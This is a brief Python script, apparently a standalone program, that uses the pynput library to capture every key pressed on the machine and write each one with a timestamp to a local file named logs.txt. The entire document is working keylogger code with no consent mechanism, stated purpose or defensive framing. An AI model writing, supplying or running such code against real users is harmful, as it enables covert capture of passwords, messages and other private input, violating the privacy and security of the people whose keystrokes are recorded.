from pynput import keyboard
import logging

logging.basicConfig(
    filename='logs.txt',
    level=logging.DEBUG,
    format='%(asctime)s - %(message)s',
    datefmt='%d-%b-%Y %H:%M:%S',
    encoding='utf-8')


def key_pressed(key):
    """Logging pressed key in file"""
    logging.debug(str(key))


with keyboard.Listener(on_press=key_pressed) as listener:
    listener.join()
